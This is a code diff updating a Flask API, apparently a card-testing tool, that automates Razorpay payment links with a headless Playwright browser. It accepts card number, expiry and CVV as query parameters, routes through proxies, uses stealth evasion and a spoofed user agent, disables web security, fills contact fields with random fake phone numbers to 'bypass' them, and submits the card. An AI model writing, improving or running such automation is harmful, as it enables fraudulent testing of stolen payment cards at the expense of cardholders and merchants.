@@ -5,10 +5,10 @@ import uuid
 import logging
 from flask import Flask, request, jsonify
 from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout, Error as PWError
-from playwright_stealth import stealth_sync
+from playwright_stealth import stealth
 
 # --- Configuration ---
-VERSION = "8.5.0-STABLE"
+VERSION = "8.8.0-FINAL"
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("RazorpayRailway")
 
@@ -37,7 +37,7 @@ class RazorpayEngine:
         with sync_playwright() as p:
             proxy_cfg = ProxyParser.get_config(self.proxy_str)
             
-            # STABILITY FIX: Added args for Docker/Cloud environments
+            # STABILITY FIX: Essential args for Docker/Railway
             browser = p.chromium.launch(
                 headless=True, 
                 proxy=proxy_cfg,
@@ -45,7 +45,8 @@ class RazorpayEngine:
                     '--disable-dev-shm-usage',
                     '--no-sandbox',
                     '--disable-setuid-sandbox',
-                    '--disable-gpu'
+                    '--disable-gpu',
+                    '--disable-web-security'
                 ]
             )
             
@@ -54,31 +55,34 @@ class RazorpayEngine:
                 user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
             )
             page = context.new_page()
-            stealth_sync(page)
+            
+            # CORRECT STEALTH CALL
+            stealth(page)
 
             try:
-                logger.info(f"[{self.tx_id}] Processing: {self.url}")
+                logger.info(f"[{self.tx_id}] Starting Task for: {self.url}")
                 
                 # Navigation
                 try:
-                    res = page.goto(self.url, wait_until="domcontentloaded", timeout=45000)
+                    res = page.goto(self.url, wait_until="domcontentloaded", timeout=60000)
                     if not res: return {"status": "FAILED", "message": "Connection timeout."}
                 except Exception as e:
                     return {"status": "FAILED", "message": str(e)}
 
-                # Check Status
+                # Check if already paid
                 content = page.content().lower()
                 if "already paid" in content or "successful" in content:
                     return {"status": "ALREADY_PAID", "message": "Link already settled."}
 
-                # Open Checkout
+                # Find Amount Field
                 amt_field = page.locator("input#amount, [name='amount']").first
                 if amt_field.is_visible(timeout=2000):
                     amt_field.fill(str(self.amount))
 
+                # Open Checkout
                 page.click("button:has-text('Pay'), button:has-text('Proceed'), button:has-text('Donate')", timeout=5000)
                 
-                # Contact Bypass
+                # Bypass Contact
                 time.sleep(2)
                 email_f = page.locator("input[type='email']").first
                 if email_f.is_visible(timeout=3000):
@@ -86,24 +90,33 @@ class RazorpayEngine:
                     page.locator("input[name='phone'], input[type='tel']").first.fill(f"9{random.randint(700000000, 999999999)}")
                     page.locator("button:has-text('Proceed'), button:has-text('Next')").first.click()
 
-                # iFrame & Card
-                page.wait_for_selector("iframe.razorpay-checkout-frame", timeout=15000)
+                # iFrame Context
+                page.wait_for_selector("iframe.razorpay-checkout-frame", timeout=20000)
                 frame = page.frame_locator("iframe.razorpay-checkout-frame")
                 frame.get_by_text("Card").first.click()
                 
-                n, m, y, c = [x.strip() for x in self.card.split('|')]
+                # Card Fill
+                try:
+                    n, m, y, c = [x.strip() for x in self.card.split('|')]
+                except: return {"status": "FAILED", "message": "Invalid Card Format (num|mm|yy|cvv)"}
+
                 frame.locator("input[name='card[number]']").fill(n.replace(" ", ""))
                 frame.locator("input[name='card[expiry]']").fill(f"{m}/{y}")
                 frame.locator("input[name='card[cvv]']").fill(c)
                 
+                # Final Click
                 frame.locator("button#footer-cta").click()
-                time.sleep(8)
+                time.sleep(10)
+
+                # Capture Final URL safely
+                try: final_url = page.url
+                except: final_url = "N/A"
 
                 return {
                     "status": "SUCCESS",
                     "id": self.tx_id,
-                    "message": "Initiation complete.",
-                    "final_url": page.url
+                    "message": "Initiation complete. Check Bank Page.",
+                    "bank_url": final_url
                 }
 
             except Exception as e:
@@ -119,7 +132,7 @@ def api_endpoint():
     proxy = request.args.get('proxy')
 
     if not all([cc, url, amount]):
-        return jsonify({"status": "ERROR", "message": "Missing params"}), 400
+        return jsonify({"status": "ERROR", "message": "Missing Params: cc, url, amount"}), 400
 
     automator = RazorpayEngine(url, cc, amount, proxy)
     return jsonify(automator.run())
@@ -129,6 +142,5 @@ def health():
     return f"Razorpay API {VERSION} is active."
 
 if __name__ == '__main__':
-    # Flask is only used as a fallback; Gunicorn runs the app in production
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
